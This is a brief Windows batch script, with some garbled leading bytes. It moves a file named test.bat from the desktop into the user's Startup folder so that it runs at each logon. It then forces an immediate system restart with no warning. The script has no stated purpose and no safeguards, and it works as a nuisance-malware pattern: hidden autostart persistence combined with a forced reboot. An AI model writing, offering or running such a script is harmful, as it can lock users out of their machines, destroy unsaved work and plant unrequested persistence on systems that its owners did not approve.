��
cls
@echo off
rem Set source and destination paths
set source="C:\Users\%USERNAME%\Desktop\Normal\test.bat"
set destination="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

rem Move the file to the Startup folder
move %source% %destination%

shutdown /r /t 0